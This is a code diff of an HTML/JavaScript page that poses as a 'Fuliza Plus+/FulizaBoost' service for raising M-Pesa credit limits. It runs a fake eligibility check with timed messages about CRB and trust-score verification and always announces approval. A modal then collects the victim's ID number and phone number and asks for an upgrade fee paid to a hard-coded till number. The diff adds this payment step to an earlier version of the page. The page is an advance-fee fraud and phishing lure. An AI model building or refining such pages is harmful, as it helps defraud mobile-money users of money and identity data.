@@ -3,178 +3,198 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Fuliza Boost</title>
+<title>FulizaBoost</title>
 
 <style>
 body {
   margin: 0;
-  font-family: Arial, sans-serif;
-  background: #f5f6f7;
-  display: flex;
-  justify-content: center;
-}
-
-.container {
-  width: 100%;
-  max-width: 420px;
-  padding: 20px;
-}
-
-.card {
-  background: #fff;
-  border-radius: 20px;
-  padding: 20px;
+  font-family: Arial;
+  background: #f3f4f6;
   text-align: center;
-  box-shadow: 0 10px 30px rgba(0,0,0,0.05);
 }
 
-.title {
-  font-size: 26px;
-  font-weight: bold;
+/* CARD */
+.card {
+  width: 90%;
+  max-width: 350px;
+  margin: 80px auto;
+  background: #fff;
+  padding: 25px;
+  border-radius: 20px;
 }
 
-.subtitle {
-  color: gray;
-  margin-bottom: 20px;
-}
-
-.input {
+/* BUTTON */
+button {
   width: 100%;
-  padding: 15px;
-  border-radius: 12px;
-  border: 1px solid #ddd;
-  margin-bottom: 15px;
-  font-size: 16px;
-}
-
-.btn {
-  width: 100%;
-  padding: 15px;
+  padding: 14px;
   border-radius: 12px;
   border: none;
-  background: #1e9e4a;
-  color: white;
-  font-size: 16px;
-  font-weight: bold;
   cursor: pointer;
 }
 
+.green { background: #22c55e; color: white; }
+.dark { background: #0f172a; color: white; }
+
+input {
+  width: 100%;
+  padding: 14px;
+  margin: 10px 0;
+  border-radius: 10px;
+  border: 1px solid #ddd;
+}
+
+/* GRID */
 .grid {
   display: grid;
   grid-template-columns: 1fr 1fr;
-  gap: 12px;
+  gap: 10px;
+  padding: 20px;
 }
 
-.limit {
-  padding: 20px;
-  border-radius: 14px;
-  background: #fff;
-  border: 1px solid #eee;
+.box {
+  background: white;
+  padding: 15px;
+  border-radius: 12px;
+  border: 1px solid #ddd;
   cursor: pointer;
 }
 
-.limit.active {
-  border: 2px solid #1e9e4a;
-  background: #eaf7ef;
+.box.active {
+  border: 2px solid green;
 }
 
-.amount {
-  color: #1e9e4a;
-  font-weight: bold;
-  font-size: 18px;
-}
-
-.fee {
-  font-size: 12px;
-  color: gray;
-}
-
+/* LOADER */
 .loader {
-  border: 5px solid #eee;
-  border-top: 5px solid #1e9e4a;
-  border-radius: 50%;
   width: 50px;
   height: 50px;
+  border: 5px solid #eee;
+  border-top: 5px solid green;
+  border-radius: 50%;
   animation: spin 1s linear infinite;
-  margin: 20px auto;
+  margin: auto;
 }
 
 @keyframes spin {
-  100% { transform: rotate(360deg); }
+  to { transform: rotate(360deg); }
 }
 
-.hidden {
+/* MODAL */
+.modal {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0,0,0,0.5);
   display: none;
+  justify-content: center;
+  align-items: center;
 }
+
+.modal-box {
+  width: 90%;
+  max-width: 400px;
+  background: white;
+  border-radius: 20px;
+  overflow: hidden;
+}
+
+/* HEADER */
+.modal-header {
+  background: #22c55e;
+  color: white;
+  padding: 20px;
+  text-align: left;
+}
+
+.modal-body {
+  padding: 20px;
+}
+
+.notice {
+  background: #e6f7ed;
+  padding: 15px;
+  border-radius: 10px;
+  font-size: 14px;
+  margin-bottom: 15px;
+}
+
+/* FOOTER */
+.row {
+  display: flex;
+  gap: 10px;
+}
+
+.cancel { background: #eee; }
 </style>
 </head>
 
 <body>
 
-<div class="container">
+<!-- STEP 1 -->
+<div id="step1" class="card">
+  <h2>Fuliza Plus+</h2>
+  <input id="phone" placeholder="Enter M-Pesa Number">
+  <button class="green" onclick="start()">Check My Eligibility</button>
+</div>
 
-  <!-- SCREEN 1 -->
-  <div id="screen1" class="card">
-    <h2 class="title">Fuliza Plus+</h2>
-    <p class="subtitle">Verify to unlock higher limits</p>
+<!-- STEP 2 -->
+<div id="step2" class="card" style="display:none;">
+  <div class="loader"></div>
+  <h3 id="loadingText">Connecting...</h3>
+</div>
 
-    <input class="input" id="phone" placeholder="Enter M-Pesa Number">
-    <button class="btn" onclick="startCheck()">Check My Eligibility</button>
+<!-- STEP 3 -->
+<div id="step3" class="card" style="display:none;">
+  <h2>✅ Congratulations!</h2>
+  <button class="dark" onclick="showLimits()">Proceed</button>
+</div>
+
+<!-- STEP 4 -->
+<div id="step4" style="display:none;">
+  <h2>FulizaBoost</h2>
+  <div class="grid" id="limits"></div>
+  <button class="dark" onclick="openModal()">Proceed to Upgrade Limit</button>
+</div>
+
+<!-- MODAL -->
+<div class="modal" id="modal">
+  <div class="modal-box">
+
+    <div class="modal-header">
+      <small>SECURE FULIZA APPLICATION</small>
+      <h3 id="limitText">Limit will be boosted to Ksh 3,000</h3>
+    </div>
+
+    <div class="modal-body">
+
+      <div class="notice" id="noticeText"></div>
+
+      <input placeholder="ID Number" id="idNumber">
+      <input placeholder="Phone Number" id="phoneNumber">
+
+      <div class="row">
+        <button class="cancel" onclick="closeModal()">Cancel</button>
+        <button class="green" id="payBtn" onclick="pay()">Pay</button>
+      </div>
+
+    </div>
   </div>
-
-  <!-- SCREEN 2 -->
-  <div id="screen2" class="card hidden">
-    <div class="loader"></div>
-    <h3 id="loadingText">Connecting...</h3>
-    <p class="subtitle">Accessing secure databases...</p>
-  </div>
-
-  <!-- SCREEN 3 -->
-  <div id="screen3" class="card hidden">
-    <h2>Congratulations!</h2>
-    <p id="resultText"></p>
-    <button class="btn" onclick="showLimits()">Proceed to Upgrade</button>
-  </div>
-
-  <!-- SCREEN 4 -->
-  <div id="screen4" class="hidden">
-    <h2>FulizaBoost</h2>
-    <p class="subtitle">Select Your New Approved Limit</p>
-
-    <div class="grid" id="limits"></div>
-
-    <button class="btn" id="upgradeBtn" style="margin-top:20px;">
-      Upgrade
-    </button>
-  </div>
-
 </div>
 
 <script>
 
-let selectedAmount = null;
+const TILL_NUMBER = "6363781";
 
-const limits = [
-  {amount:3000, fee:250},
-  {amount:5000, fee:293},
-  {amount:7500, fee:350},
-  {amount:10000, fee:500},
-  {amount:12500, fee:747},
-  {amount:16000, fee:898},
-  {amount:21000, fee:1015},
-  {amount:25500, fee:1220},
-  {amount:30000, fee:1533},
-  {amount:35000, fee:1730},
-  {amount:45000, fee:2000},
-  {amount:60000, fee:2250},
-  {amount:70000, fee:2500}
-];
+let selectedLimit = "Ksh 3,000";
+let selectedFee = "250";
 
-function startCheck() {
-  document.getElementById("screen1").classList.add("hidden");
-  document.getElementById("screen2").classList.remove("hidden");
+/* START PROCESS */
+function start() {
+  document.getElementById("step1").style.display = "none";
+  document.getElementById("step2").style.display = "block";
 
-  let steps = [
+  const steps = [
     "Connecting...",
     "Verifying CRB Status...",
     "Finalizing Trust Score..."
@@ -182,52 +202,81 @@ function startCheck() {
 
   let i = 0;
 
-  let interval = setInterval(() => {
+  const interval = setInterval(() => {
     document.getElementById("loadingText").innerText = steps[i];
     i++;
 
     if (i === steps.length) {
       clearInterval(interval);
-      setTimeout(showSuccess, 1000);
+      setTimeout(() => {
+        document.getElementById("step2").style.display = "none";
+        document.getElementById("step3").style.display = "block";
+      }, 1000);
     }
   }, 2000);
 }
 
-function showSuccess() {
-  document.getElementById("screen2").classList.add("hidden");
-  document.getElementById("screen3").classList.remove("hidden");
-
-  let phone = document.getElementById("phone").value;
-  document.getElementById("resultText").innerText =
-    phone + " is eligible for a boost.";
-}
-
+/* SHOW LIMITS */
 function showLimits() {
-  document.getElementById("screen3").classList.add("hidden");
-  document.getElementById("screen4").classList.remove("hidden");
+  document.getElementById("step3").style.display = "none";
+  document.getElementById("step4").style.display = "block";
 
-  let container = document.getElementById("limits");
+  const data = [
+    ["Ksh 3,000","250"],
+    ["Ksh 5,000","293"],
+    ["Ksh 10,000","500"],
+    ["Ksh 20,000","800"]
+  ];
 
-  limits.forEach(item => {
-    let div = document.createElement("div");
-    div.className = "limit";
+  const container = document.getElementById("limits");
 
-    div.innerHTML = `
-      <div class="amount">Ksh ${item.amount}</div>
-      <div class="fee">Fee: ${item.fee}</div>
-    `;
+  data.forEach(item => {
+    const div = document.createElement("div");
+    div.className = "box";
+    div.innerHTML = `<b>${item[0]}</b><br><small>Fee: Ksh ${item[1]}</small>`;
 
     div.onclick = () => {
-      document.querySelectorAll(".limit").forEach(x => x.classList.remove("active"));
+      document.querySelectorAll(".box").forEach(x => x.classList.remove("active"));
       div.classList.add("active");
-      selectedAmount = item.amount;
 
-      document.getElementById("upgradeBtn").innerText =
-        "Upgrade to Ksh " + item.amount;
+      selectedLimit = item[0];
+      selectedFee = item[1];
     };
 
     container.appendChild(div);
   });
+}
+
+/* OPEN MODAL */
+function openModal() {
+  document.getElementById("modal").style.display = "flex";
+
+  document.getElementById("limitText").innerText =
+    "Limit will be boosted to " + selectedLimit;
+
+  document.getElementById("payBtn").innerText =
+    "Pay Ksh " + selectedFee;
+
+  document.getElementById("noticeText").innerHTML =
+    `Enter your Safaricom number for VERIFICATION! Once payment to Till Number <b>${TILL_NUMBER}</b> is confirmed, your boost request will begin processing.`;
+}
+
+/* CLOSE */
+function closeModal() {
+  document.getElementById("modal").style.display = "none";
+}
+
+/* PAY */
+function pay() {
+  let id = document.getElementById("idNumber").value;
+  let phone = document.getElementById("phoneNumber").value;
+
+  if (!id || !phone) {
+    alert("Fill all fields");
+    return;
+  }
+
+  alert("Processing payment...");
 }
 
 </script>
